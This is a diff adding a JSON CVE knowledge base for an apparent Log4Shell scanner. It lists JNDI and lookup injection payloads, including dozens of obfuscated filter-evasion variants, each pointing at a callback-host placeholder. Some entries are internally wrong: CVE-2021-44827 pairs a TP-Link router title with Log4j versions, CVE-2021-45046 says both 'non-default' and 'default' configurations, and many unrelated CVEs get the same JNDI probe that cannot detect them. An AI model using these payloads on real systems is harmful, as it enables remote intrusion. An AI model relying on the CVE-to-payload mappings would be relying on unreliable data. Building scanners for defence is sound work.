@@ -1,0 +1,589 @@
+{
+  "metadata": {
+    "name": "log4j-scan CVE knowledge base",
+    "description": "Offline, bundled detection payloads for Apache Log4Shell and related JNDI/lookup injection CVEs. Refresh with: python3 log4j-scan.py --update-cves",
+    "version": "2026.10.03",
+    "last_updated": "2026-10-03T05:28:37Z",
+    "sources": [
+      "https://nvd.nist.gov/vuln/detail/CVE-2021-44228",
+      "https://nvd.nist.gov/vuln/detail/CVE-2021-45046",
+      "https://nvd.nist.gov/vuln/detail/CVE-2021-45105",
+      "https://nvd.nist.gov/vuln/detail/CVE-2021-44827",
+      "https://nvd.nist.gov/vuln/detail/CVE-2022-42889"
+    ],
+    "updater": "log4j-scan/2.0.0"
+  },
+  "cves": {
+    "CVE-2021-44228": {
+      "title": "Apache Log4j2 2.0-beta9 through 2.15.0 (excluding security releases 2.12.2, 2.12.3, and 2.3.1) JNDI features used in configuration, log messages, and parameters do not protect against attacker control",
+      "severity": "CRITICAL",
+      "cvss_v3": 10.0,
+      "affected": "Apache Log4j 2.0-beta7 through 2.14.1",
+      "fixed_in": "2.15.0 (recommend 2.17.1+)",
+      "oob_required": true,
+      "default": true,
+      "payloads": [
+        "${jndi:ldap://{{callback_host}}/{{random}}}",
+        "${jndi:dns://{{callback_host}}/{{random}}}",
+        "${jndi:rmi://{{callback_host}}/{{random}}}",
+        "${jndi:ldap://{{callback_host}}:1389/{{random}}}"
+      ],
+      "waf_bypass_payloads": [
+        "${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://{{callback_host}}/{{random}}}",
+        "${${::-j}ndi:rmi://{{callback_host}}/{{random}}}",
+        "${jndi:rmi://{{callback_host}}}/",
+        "${${lower:jndi}:${lower:rmi}://{{callback_host}}/{{random}}}",
+        "${${lower:${lower:jndi}}:${lower:rmi}://{{callback_host}}/{{random}}}",
+        "${${lower:j}${lower:n}${lower:d}i:${lower:rmi}://{{callback_host}}/{{random}}}",
+        "${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://{{callback_host}}/{{random}}}",
+        "${jnd${123%25ff:-${123%25ff:-i:}}ldap://{{callback_host}}/{{random}}}",
+        "${jndi:dns://{{callback_host}}}",
+        "${j${k8s:k5:-ND}i:ldap://{{callback_host}}/{{random}}}",
+        "${j${k8s:k5:-ND}i:ldap${sd:k5:-:}//{{callback_host}}/{{random}}}",
+        "${j${k8s:k5:-ND}i${sd:k5:-:}ldap://{{callback_host}}/{{random}}}",
+        "${j${k8s:k5:-ND}i${sd:k5:-:}ldap${sd:k5:-:}//{{callback_host}}/{{random}}}",
+        "${${k8s:k5:-J}${k8s:k5:-ND}i${sd:k5:-:}ldap://{{callback_host}}/{{random}}}",
+        "${${k8s:k5:-J}${k8s:k5:-ND}i${sd:k5:-:}ldap{sd:k5:-:}//{{callback_host}}/{{random}}}",
+        "${${k8s:k5:-J}${k8s:k5:-ND}i${sd:k5:-:}l${lower:D}ap${sd:k5:-:}//{{callback_host}}/{{random}}}",
+        "${j${k8s:k5:-ND}i${sd:k5:-:}${lower:L}dap${sd:k5:-:}//{{callback_host}}/{{random}}",
+        "${${k8s:k5:-J}${k8s:k5:-ND}i${sd:k5:-:}l${lower:D}a${::-p}${sd:k5:-:}//{{callback_host}}/{{random}}}",
+        "${jndi:${lower:l}${lower:d}a${lower:p}://{{callback_host}}}",
+        "${jnd${upper:i}:ldap://{{callback_host}}/{{random}}}",
+        "${j${${:-l}${:-o}${:-w}${:-e}${:-r}:n}di:ldap://{{callback_host}}/{{random}}}",
+        "${${lower:${lower:jndi}}:${lower:rmi}://{{callback_host}}/{{random}}/payload7}",
+        "${${lower:jndi}:${lower:rmi}://{{callback_host}}/{{random}}/payload6}",
+        "%%0a${${lower:${lower:jndi}}:${lower:rmi}://{{callback_host}}/{{random}}/payload7}",
+        "%%0a${${lower:jndi}:${lower:rmi}://{{callback_host}}/{{random}}/payload6}",
+        "%%00${${lower:${lower:jndi}}:${lower:rmi}://{{callback_host}}/{{random}}/payload7}",
+        "%%00${${lower:jndi}:${lower:rmi}://{{callback_host}}/{{random}}/payload6}",
+        "${${date:'j'}${date:'n'}${date:'d'}${date:'i'}:${date:'l'}${date:'d'}${date:'a'}${date:'p'}://{{callback_host}}/{{random}}/payload2}",
+        "${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://{{callback_host}}/{{random}}/payload9}",
+        "${${lower:j}ndi:${lower:l}${lower:d}a${lower:p}://{{callback_host}}/{{random}}/payload16}",
+        "${${lower:n}${lower:d}i:${lower:rmi}://{{callback_host}}/{{random}}/payload8}",
+        "${j${k8s:k5:-ND}${sd:k5:-${123%25ff:-${123%25ff:-${upper:\u0131}:}}}ldap://{{callback_host}}/{{random}}/payload15}",
+        "${jnd${sys:UNIX:-i}:ldap:/{{callback_host}}/{{random}}/payload17}",
+        "${jnd${upper:\u0131}:ldap://{{callback_host}}/{{random}}/payload18}",
+        "${jndi:ldap://{{callback_host}}/{{random}}/payload4}",
+        "${jndi:ldap://127.0.0.1#{\\{{{callback_host}}}}/{payload13}}",
+        "${jndi:rmi://{{callback_host}}}",
+        "%%0a${${date:'j'}${date:'n'}${date:'d'}${date:'i'}:${date:'l'}${date:'d'}${date:'a'}${date:'p'}://{{callback_host}}/{{random}}/payload2}",
+        "%%0a${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://{{callback_host}}/{{random}}/payload9}",
+        "%%0a${${lower:j}ndi:${lower:l}${lower:d}a${lower:p}://{{callback_host}}/{{random}}/payload16}",
+        "%%0a${${lower:n}${lower:d}i:${lower:rmi}://{{callback_host}}/{{random}}/payload8}",
+        "%%0a${j${k8s:k5:-ND}${sd:k5:-${123%25ff:-${123%25ff:-${upper:\u0131}:}}}ldap://{{callback_host}}/{{random}}/payload15}",
+        "%%0a${jnd${sys:UNIX:-i}:ldap:/{{callback_host}}/{{random}}/payload17}",
+        "%%0a${jnd${upper:\u0131}:ldap://{{callback_host}}/{{random}}/payload18}",
+        "%%0a${jndi:ldap://{{callback_host}}/{{random}}/payload4}",
+        "%%0a${jndi:ldap://127.0.0.1#{\\{{{callback_host}}}}/{payload13}}",
+        "%%0a${jndi:rmi://{{callback_host}}}",
+        "%%00${${date:'j'}${date:'n'}${date:'d'}${date:'i'}:${date:'l'}${date:'d'}${date:'a'}${date:'p'}://{{callback_host}}/{{random}}/payload2}",
+        "%%00${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://{{callback_host}}/{{random}}/payload9}",
+        "%%00${${lower:j}ndi:${lower:l}${lower:d}a${lower:p}://{{callback_host}}/{{random}}/payload16}",
+        "%%00${${lower:n}${lower:d}i:${lower:rmi}://{{callback_host}}/{{random}}/payload8}",
+        "%%00${j${k8s:k5:-ND}${sd:k5:-${123%25ff:-${123%25ff:-${upper:\u0131}:}}}ldap://{{callback_host}}/{{random}}/payload15}",
+        "%%00${jnd${sys:UNIX:-i}:ldap:/{{callback_host}}/{{random}}/payload17}",
+        "%%00${jnd${upper:\u0131}:ldap://{{callback_host}}/{{random}}/payload18}",
+        "%%00${jndi:ldap://{{callback_host}}/{{random}}/payload4}",
+        "%%00${jndi:ldap://127.0.0.1#{\\{{{callback_host}}}}/{payload13}}",
+        "%%00${jndi:rmi://{{callback_host}}}"
+      ]
+    },
+    "CVE-2021-45046": {
+      "title": "It was found that the fix to address CVE-2021-44228 in Apache Log4j 2.15.0 was incomplete in certain non-default configurations. This could allows attackers with control over Thread Context Map (MDC) ",
+      "severity": "CRITICAL",
+      "cvss_v3": 9.0,
+      "affected": "Apache Log4j 2.0-beta7 through 2.15.0 (default configurations)",
+      "fixed_in": "2.16.0 (recommend 2.17.1+)",
+      "oob_required": true,
+      "default": false,
+      "payloads": [
+        "${jndi:ldap://127.0.0.1#{{callback_host}}:1389/{{random}}}",
+        "${jndi:ldap://127.0.0.1#{{callback_host}}/{{random}}}",
+        "${jndi:ldap://127.1.1.1#{{callback_host}}/{{random}}}"
+      ],
+      "waf_bypass_payloads": []
+    },
+    "CVE-2021-45105": {
+      "title": "Apache Log4j2 versions 2.0-alpha1 through 2.16.0 (excluding 2.12.3 and 2.3.1) did not protect from uncontrolled recursion from self-referential lookups. This allows an attacker with control over Threa",
+      "severity": "MEDIUM",
+      "cvss_v3": 5.9,
+      "affected": "Apache Log4j 2.0-alpha1 through 2.16.0 (non-default configurations using Context Data lookups in patterns)",
+      "fixed_in": "2.17.0",
+      "oob_required": true,
+      "default": false,
+      "payloads": [
+        "${${::-${::-$}}:/:ctx:{{random}}.{{callback_host}}}",
+        "${ctx:{{random}}.{{callback_host}}",
+        "$${ctx:{{random}}.{{callback_host}}",
+        "${map:{{random}}.{{callback_host}}",
+        "${sys:{{random}}.{{callback_host}}"
+      ],
+      "waf_bypass_payloads": []
+    },
+    "CVE-2021-44827": {
+      "title": "There is remote authenticated OS command injection on TP-Link Archer C20i 0.9.1 3.2 v003a.0 Build 170221 Rel.55462n devices vie the X_TP_ExternalIPv6Address HTTP parameter, allowing a remote attacker ",
+      "severity": "HIGH",
+      "cvss_v3": 8.8,
+      "affected": "Apache Log4j 2.0-beta7 through 2.17.0 (requires attacker-controlled configuration), 2.17.1 not affected by data source lookup",
+      "fixed_in": "2.17.1",
+      "oob_required": true,
+      "default": false,
+      "payloads": [
+        "${jndi:ldap://{{callback_host}}/{{random}}?config=jdbc}",
+        "${jndi:dns://{{random}}.jdbc.{{callback_host}}}"
+      ],
+      "waf_bypass_payloads": []
+    },
+    "CVE-2022-42889": {
+      "title": "Apache Commons Text performs variable interpolation, allowing properties to be dynamically evaluated and expanded. The standard format for interpolation is \"${prefix:name}\", where \"prefix\" is used to ",
+      "severity": "CRITICAL",
+      "cvss_v3": 9.8,
+      "affected": "Apache Commons Text 1.5 through 1.10.0",
+      "fixed_in": "1.10.1",
+      "oob_required": true,
+      "default": false,
+      "payloads": [
+        "${url:UTF-8::https://{{callback_host}}/}",
+        "${url:UTF-8::https://{{callback_host}}/{{random}}}",
+        "${url:UTF-8::http://{{callback_host}}/}",
+        "${url:UTF-8::http://{{callback_host}}/{{random}}}",
+        "${dns:address|{{callback_host}}}"
+      ],
+      "waf_bypass_payloads": []
+    },
+    "CVE-2008-7261": {
+      "title": "The Workplace (aka WP) component in IBM FileNet P8 Application Engine (P8AE) 3.5.1 before 3.5.1-010 records DEBUG messages containing user credentials in the log4j.xml file, which might allow local us",
+      "severity": "UNKNOWN",
+      "cvss_v3": 2.1,
+      "affected": "see NVD record",
+      "fixed_in": "see NVD record",
+      "oob_required": true,
+      "default": false,
+      "payloads": [
+        "${jndi:ldap://{{callback_host}}/{{random}}}"
+      ],
+      "waf_bypass_payloads": [],
+      "reference": "https://nvd.nist.gov/vuln/detail/CVE-2008-7261"
+    },
+    "CVE-2012-5616": {
+      "title": "Apache CloudStack 4.0.0-incubating and Citrix CloudPlatform (formerly Citrix CloudStack) before 3.0.6 stores sensitive information in the log4j.conf log file, which allows local users to obtain (1) th",
+      "severity": "UNKNOWN",
+      "cvss_v3": 1.5,
+      "affected": "see NVD record",
+      "fixed_in": "see NVD record",
+      "oob_required": true,
+      "default": false,
+      "payloads": [
+        "${jndi:ldap://{{callback_host}}/{{random}}}"
+      ],
+      "waf_bypass_payloads": [],
+      "reference": "https://nvd.nist.gov/vuln/detail/CVE-2012-5616"
+    },
+    "CVE-2014-0722": {
+      "title": "The log4jinit web application in Cisco Unified Communications Manager (UCM) does not properly validate authentication, which allows remote attackers to cause a denial of service (performance degradati",
+      "severity": "UNKNOWN",
+      "cvss_v3": 5.0,
+      "affected": "see NVD record",
+      "fixed_in": "see NVD record",
+      "oob_required": true,
+      "default": false,
+      "payloads": [
+        "${jndi:ldap://{{callback_host}}/{{random}}}"
+      ],
+      "waf_bypass_payloads": [],
+      "reference": "https://nvd.nist.gov/vuln/detail/CVE-2014-0722"
+    },
+    "CVE-2017-5645": {
+      "title": "In Apache Log4j 2.x before 2.8.2, when using the TCP socket server or UDP socket server to receive serialized log events from another application, a specially crafted binary payload can be sent that, ",
+      "severity": "CRITICAL",
+      "cvss_v3": 9.8,
+      "affected": "see NVD record",
+      "fixed_in": "see NVD record",
+      "oob_required": true,
+      "default": false,
+      "payloads": [
+        "${jndi:ldap://{{callback_host}}/{{random}}}"
+      ],
+      "waf_bypass_payloads": [],
+      "reference": "https://nvd.nist.gov/vuln/detail/CVE-2017-5645"
+    },
+    "CVE-2019-17571": {
+      "title": "Included in Log4j 1.2 is a SocketServer class that is vulnerable to deserialization of untrusted data which can be exploited to remotely execute arbitrary code when combined with a deserialization gad",
+      "severity": "CRITICAL",
+      "cvss_v3": 9.8,
+      "affected": "see NVD record",
+      "fixed_in": "see NVD record",
+      "oob_required": true,
+      "default": false,
+      "payloads": [
+        "${jndi:ldap://{{callback_host}}/{{random}}}"
+      ],
+      "waf_bypass_payloads": [],
+      "reference": "https://nvd.nist.gov/vuln/detail/CVE-2019-17571"
+    },
+    "CVE-2020-9488": {
+      "title": "Improper validation of certificate with host mismatch in Apache Log4j SMTP appender. This could allow an SMTPS connection to be intercepted by a man-in-the-middle attack which could leak any log messa",
+      "severity": "LOW",
+      "cvss_v3": 3.7,
+      "affected": "see NVD record",
+      "fixed_in": "see NVD record",
+      "oob_required": true,
+      "default": false,
+      "payloads": [
+        "${jndi:ldap://{{callback_host}}/{{random}}}"
+      ],
+      "waf_bypass_payloads": [],
+      "reference": "https://nvd.nist.gov/vuln/detail/CVE-2020-9488"
+    },
+    "CVE-2021-3100": {
+      "title": "The Apache Log4j hotpatch package before log4j-cve-2021-44228-hotpatch-1.1-13 didn\u2019t mimic the permissions of the JVM being patched, allowing it to escalate privileges.",
+      "severity": "HIGH",
+      "cvss_v3": 8.8,
+      "affected": "see NVD record",
+      "fixed_in": "see NVD record",
+      "oob_required": true,
+      "default": false,
+      "payloads": [
+        "${jndi:ldap://{{callback_host}}/{{random}}}"
+      ],
+      "waf_bypass_payloads": [],
+      "reference": "https://nvd.nist.gov/vuln/detail/CVE-2021-3100"
+    },
+    "CVE-2021-4104": {
+      "title": "JMSAppender in Log4j 1.2 is vulnerable to deserialization of untrusted data when the attacker has write access to the Log4j configuration. The attacker can provide TopicBindingName and TopicConnection",
+      "severity": "HIGH",
+      "cvss_v3": 7.5,
+      "affected": "see NVD record",
+      "fixed_in": "see NVD record",
+      "oob_required": true,
+      "default": false,
+      "payloads": [
+        "${jndi:ldap://{{callback_host}}/{{random}}}"
+      ],
+      "waf_bypass_payloads": [],
+      "reference": "https://nvd.nist.gov/vuln/detail/CVE-2021-4104"
+    },
+    "CVE-2021-4125": {
+      "title": "It was found that the original fix for log4j CVE-2021-44228 and CVE-2021-45046 in the OpenShift metering hive containers was incomplete, as not all JndiLookup.class files were removed. This CVE only a",
+      "severity": "HIGH",
+      "cvss_v3": 8.1,
+      "affected": "see NVD record",
+      "fixed_in": "see NVD record",
+      "oob_required": true,
+      "default": false,
+      "payloads": [
+        "${jndi:ldap://{{callback_host}}/{{random}}}"
+      ],
+      "waf_bypass_payloads": [],
+      "reference": "https://nvd.nist.gov/vuln/detail/CVE-2021-4125"
+    },
+    "CVE-2021-44832": {
+      "title": "Apache Log4j2 versions 2.0-beta7 through 2.17.0 (excluding security fix releases 2.3.2 and 2.12.4) are vulnerable to a remote code execution (RCE) attack when a configuration uses a JDBC Appender with",
+      "severity": "MEDIUM",
+      "cvss_v3": 6.6,
+      "affected": "see NVD record",
+      "fixed_in": "see NVD record",
+      "oob_required": true,
+      "default": false,
+      "payloads": [
+        "${jndi:ldap://{{callback_host}}/{{random}}}"
+      ],
+      "waf_bypass_payloads": [],
+      "reference": "https://nvd.nist.gov/vuln/detail/CVE-2021-44832"
+    },
+    "CVE-2022-0070": {
+      "title": "Incomplete fix for CVE-2021-3100. The Apache Log4j hotpatch package starting with log4j-cve-2021-44228-hotpatch-1.1-16 will now explicitly mimic the Linux capabilities and cgroups of the target Java p",
+      "severity": "HIGH",
+      "cvss_v3": 8.8,
+      "affected": "see NVD record",
+      "fixed_in": "see NVD record",
+      "oob_required": true,
+      "default": false,
+      "payloads": [
+        "${jndi:ldap://{{callback_host}}/{{random}}}"
+      ],
+      "waf_bypass_payloads": [],
+      "reference": "https://nvd.nist.gov/vuln/detail/CVE-2022-0070"
+    },
+    "CVE-2022-21704": {
+      "title": "log4js-node is a port of log4js to node.js. In affected versions default file permissions for log files created by the file, fileSync and dateFile appenders are world-readable (in unix). This could ca",
+      "severity": "MEDIUM",
+      "cvss_v3": 5.5,
+      "affected": "see NVD record",
+      "fixed_in": "see NVD record",
+      "oob_required": true,
+      "default": false,
+      "payloads": [
+        "${jndi:ldap://{{callback_host}}/{{random}}}"
+      ],
+      "waf_bypass_payloads": [],
+      "reference": "https://nvd.nist.gov/vuln/detail/CVE-2022-21704"
+    },
+    "CVE-2022-23302": {
+      "title": "JMSSink in all versions of Log4j 1.x is vulnerable to deserialization of untrusted data when the attacker has write access to the Log4j configuration or if the configuration references an LDAP service",
+      "severity": "HIGH",
+      "cvss_v3": 8.8,
+      "affected": "see NVD record",
+      "fixed_in": "see NVD record",
+      "oob_required": true,
+      "default": false,
+      "payloads": [
+        "${jndi:ldap://{{callback_host}}/{{random}}}"
+      ],
+      "waf_bypass_payloads": [],
+      "reference": "https://nvd.nist.gov/vuln/detail/CVE-2022-23302"
+    },
+    "CVE-2022-23305": {
+      "title": "By design, the JDBCAppender in Log4j 1.2.x accepts an SQL statement as a configuration parameter where the values to be inserted are converters from PatternLayout. The message converter, %m, is likely",
+      "severity": "CRITICAL",
+      "cvss_v3": 9.8,
+      "affected": "see NVD record",
+      "fixed_in": "see NVD record",
+      "oob_required": true,
+      "default": false,
+      "payloads": [
+        "${jndi:ldap://{{callback_host}}/{{random}}}"
+      ],
+      "waf_bypass_payloads": [],
+      "reference": "https://nvd.nist.gov/vuln/detail/CVE-2022-23305"
+    },
+    "CVE-2022-23307": {
+      "title": "CVE-2020-9493 identified a deserialization issue that was present in Apache Chainsaw. Prior to Chainsaw V2.0 Chainsaw was a component of Apache Log4j 1.2.x where the same issue exists.",
+      "severity": "HIGH",
+      "cvss_v3": 8.8,
+      "affected": "see NVD record",
+      "fixed_in": "see NVD record",
+      "oob_required": true,
+      "default": false,
+      "payloads": [
+        "${jndi:ldap://{{callback_host}}/{{random}}}"
+      ],
+      "waf_bypass_payloads": [],
+      "reference": "https://nvd.nist.gov/vuln/detail/CVE-2022-23307"
+    },
+    "CVE-2022-23848": {
+      "title": "In Alluxio before 2.7.3, the logserver does not validate the input stream. NOTE: this is not the same as the CVE-2021-44228 Log4j vulnerability.",
+      "severity": "CRITICAL",
+      "cvss_v3": 9.8,
+      "affected": "see NVD record",
+      "fixed_in": "see NVD record",
+      "oob_required": true,
+      "default": false,
+      "payloads": [
+        "${jndi:ldap://{{callback_host}}/{{random}}}"
+      ],
+      "waf_bypass_payloads": [],
+      "reference": "https://nvd.nist.gov/vuln/detail/CVE-2022-23848"
+    },
+    "CVE-2022-24818": {
+      "title": "GeoTools is an open source Java library that provides tools for geospatial data. The GeoTools library has a number of data sources that can perform unchecked JNDI lookups, which in turn can be used to",
+      "severity": "HIGH",
+      "cvss_v3": 8.2,
+      "affected": "see NVD record",
+      "fixed_in": "see NVD record",
+      "oob_required": true,
+      "default": false,
+      "payloads": [
+        "${jndi:ldap://{{callback_host}}/{{random}}}"
+      ],
+      "waf_bypass_payloads": [],
+      "reference": "https://nvd.nist.gov/vuln/detail/CVE-2022-24818"
+    },
+    "CVE-2022-29615": {
+      "title": "SAP NetWeaver Developer Studio (NWDS) - version 7.50, is based on Eclipse, which contains the logging framework log4j in version 1.x. The application's confidentiality and integrity could have a low i",
+      "severity": "LOW",
+      "cvss_v3": 3.4,
+      "affected": "see NVD record",
+      "fixed_in": "see NVD record",
+      "oob_required": true,
+      "default": false,
+      "payloads": [
+        "${jndi:ldap://{{callback_host}}/{{random}}}"
+      ],
+      "waf_bypass_payloads": [],
+      "reference": "https://nvd.nist.gov/vuln/detail/CVE-2022-29615"
+    },
+    "CVE-2022-33915": {
+      "title": "Versions of the Amazon AWS Apache Log4j hotpatch package before log4j-cve-2021-44228-hotpatch-1.3.5 are affected by a race condition that could lead to a local privilege escalation. This Hotpatch pack",
+      "severity": "HIGH",
+      "cvss_v3": 7.0,
+      "affected": "see NVD record",
+      "fixed_in": "see NVD record",
+      "oob_required": true,
+      "default": false,
+      "payloads": [
+        "${jndi:ldap://{{callback_host}}/{{random}}}"
+      ],
+      "waf_bypass_payloads": [],
+      "reference": "https://nvd.nist.gov/vuln/detail/CVE-2022-33915"
+    },
+    "CVE-2023-26464": {
+      "title": "** UNSUPPORTED WHEN ASSIGNED **\n\nWhen using the Chainsaw or SocketAppender components with Log4j 1.x on JRE less than 1.7, an attacker that manages to cause a logging entry involving a specially-craft",
+      "severity": "HIGH",
+      "cvss_v3": 7.5,
+      "affected": "see NVD record",
+      "fixed_in": "see NVD record",
+      "oob_required": true,
+      "default": false,
+      "payloads": [
+        "${jndi:ldap://{{callback_host}}/{{random}}}"
+      ],
+      "waf_bypass_payloads": [],
+      "reference": "https://nvd.nist.gov/vuln/detail/CVE-2023-26464"
+    },
+    "CVE-2023-50780": {
+      "title": "Apache ActiveMQ Artemis allows access to diagnostic information and controls through MBeans, which are also exposed through the authenticated Jolokia endpoint. Before version 2.29.0, this also include",
+      "severity": "HIGH",
+      "cvss_v3": 8.8,
+      "affected": "see NVD record",
+      "fixed_in": "see NVD record",
+      "oob_required": true,
+      "default": false,
+      "payloads": [
+        "${jndi:ldap://{{callback_host}}/{{random}}}"
+      ],
+      "waf_bypass_payloads": [],
+      "reference": "https://nvd.nist.gov/vuln/detail/CVE-2023-50780"
+    },
+    "CVE-2024-23049": {
+      "title": "An issue in symphony v.3.6.3 and before allows a remote attacker to execute arbitrary code via the log4j component.",
+      "severity": "CRITICAL",
+      "cvss_v3": 9.8,
+      "affected": "see NVD record",
+      "fixed_in": "see NVD record",
+      "oob_required": true,
+      "default": false,
+      "payloads": [
+        "${jndi:ldap://{{callback_host}}/{{random}}}"
+      ],
+      "waf_bypass_payloads": [],
+      "reference": "https://nvd.nist.gov/vuln/detail/CVE-2024-23049"
+    },
+    "CVE-2025-68161": {
+      "title": "The Socket Appender in Apache Log4j Core versions 2.0-beta9 through 2.25.2 does not perform TLS hostname verification of the peer certificate, even when the  verifyHostName https://logging.apache.org/",
+      "severity": "MEDIUM",
+      "cvss_v3": 4.8,
+      "affected": "see NVD record",
+      "fixed_in": "see NVD record",
+      "oob_required": true,
+      "default": false,
+      "payloads": [
+        "${jndi:ldap://{{callback_host}}/{{random}}}"
+      ],
+      "waf_bypass_payloads": [],
+      "reference": "https://nvd.nist.gov/vuln/detail/CVE-2025-68161"
+    },
+    "CVE-2026-34477": {
+      "title": "The fix for  CVE-2025-68161 https://logging.apache.org/security.html#CVE-2025-68161  was incomplete: it addressed hostname verification only when enabled via the  log4j2.sslVerifyHostName https://logg",
+      "severity": "MEDIUM",
+      "cvss_v3": 5.9,
+      "affected": "see NVD record",
+      "fixed_in": "see NVD record",
+      "oob_required": true,
+      "default": false,
+      "payloads": [
+        "${jndi:ldap://{{callback_host}}/{{random}}}"
+      ],
+      "waf_bypass_payloads": [],
+      "reference": "https://nvd.nist.gov/vuln/detail/CVE-2026-34477"
+    },
+    "CVE-2026-34478": {
+      "title": "Apache Log4j Core's  Rfc5424Layout https://logging.apache.org/log4j/2.x/manual/layouts.html#RFC5424Layout , in versions 2.21.0 through 2.25.3, is vulnerable to log injection via CRLF sequences due to ",
+      "severity": "HIGH",
+      "cvss_v3": 7.5,
+      "affected": "see NVD record",
+      "fixed_in": "see NVD record",
+      "oob_required": true,
+      "default": false,
+      "payloads": [
+        "${jndi:ldap://{{callback_host}}/{{random}}}"
+      ],
+      "waf_bypass_payloads": [],
+      "reference": "https://nvd.nist.gov/vuln/detail/CVE-2026-34478"
+    },
+    "CVE-2026-34479": {
+      "title": "The Log4j1XmlLayout from the Apache Log4j 1-to-Log4j 2 bridge fails to escape characters forbidden by the XML 1.0 standard, producing malformed XML output. Conforming XML parsers are required to rejec",
+      "severity": "HIGH",
+      "cvss_v3": 7.5,
+      "affected": "see NVD record",
+      "fixed_in": "see NVD record",
+      "oob_required": true,
+      "default": false,
+      "payloads": [
+        "${jndi:ldap://{{callback_host}}/{{random}}}"
+      ],
+      "waf_bypass_payloads": [],
+      "reference": "https://nvd.nist.gov/vuln/detail/CVE-2026-34479"
+    },
+    "CVE-2026-34480": {
+      "title": "Apache Log4j Core's  XmlLayout https://logging.apache.org/log4j/2.x/manual/layouts.html#XmlLayout , in versions up to and including 2.25.3, fails to sanitize characters forbidden by the  XML 1.0 speci",
+      "severity": "HIGH",
+      "cvss_v3": 7.5,
+      "affected": "see NVD record",
+      "fixed_in": "see NVD record",
+      "oob_required": true,
+      "default": false,
+      "payloads": [
+        "${jndi:ldap://{{callback_host}}/{{random}}}"
+      ],
+      "waf_bypass_payloads": [],
+      "reference": "https://nvd.nist.gov/vuln/detail/CVE-2026-34480"
+    },
+    "CVE-2026-34481": {
+      "title": "Apache Log4j's  JsonTemplateLayout https://logging.apache.org/log4j/2.x/manual/json-template-layout.html , in versions up to and including 2.25.3, produces invalid JSON output when log events contain ",
+      "severity": "HIGH",
+      "cvss_v3": 7.5,
+      "affected": "see NVD record",
+      "fixed_in": "see NVD record",
+      "oob_required": true,
+      "default": false,
+      "payloads": [
+        "${jndi:ldap://{{callback_host}}/{{random}}}"
+      ],
+      "waf_bypass_payloads": [],
+      "reference": "https://nvd.nist.gov/vuln/detail/CVE-2026-34481"
+    },
+    "CVE-2026-49844": {
+      "title": "Improper encoding of non-finite floating-point values during MapMessage JSON serialization in Apache Log4j API produces output that is not valid JSON. This issue affects Apache Log4j API versions 2.13",
+      "severity": "MEDIUM",
+      "cvss_v3": 5.9,
+      "affected": "see NVD record",
+      "fixed_in": "see NVD record",
+      "oob_required": true,
+      "default": false,
+      "payloads": [
+        "${jndi:ldap://{{callback_host}}/{{random}}}"
+      ],
+      "waf_bypass_payloads": [],
+      "reference": "https://nvd.nist.gov/vuln/detail/CVE-2026-49844"
+    },
+    "CVE-2026-59272": {
+      "title": "Any application shipping logs to RabbitMQ over TLS via the Log4j2 appender, relying on the documented default, is exposed to man-in-the-middle interception of every log event.\nSpring AMQP 4.1.0\nSpring",
+      "severity": "MEDIUM",
+      "cvss_v3": 6.8,
+      "affected": "see NVD record",
+      "fixed_in": "see NVD record",
+      "oob_required": true,
+      "default": false,
+      "payloads": [
+        "${jndi:ldap://{{callback_host}}/{{random}}}"
+      ],
+      "waf_bypass_payloads": [],
+      "reference": "https://nvd.nist.gov/vuln/detail/CVE-2026-59272"
+    },
+    "CVE-2026-85656": {
+      "title": "An OS command injection issue in the log4j-cve-2021-44228-hotpatch package in Amazon Linux before 1.3-9 might allow a local user to execute arbitrary commands with root privileges via a Java process w",
+      "severity": "HIGH",
+      "cvss_v3": 7.8,
+      "affected": "see NVD record",
+      "fixed_in": "see NVD record",
+      "oob_required": true,
+      "default": false,
+      "payloads": [
+        "${jndi:ldap://{{callback_host}}/{{random}}}"
+      ],
+      "waf_bypass_payloads": [],
+      "reference": "https://nvd.nist.gov/vuln/detail/CVE-2026-85656"
+    }
+  }
+}
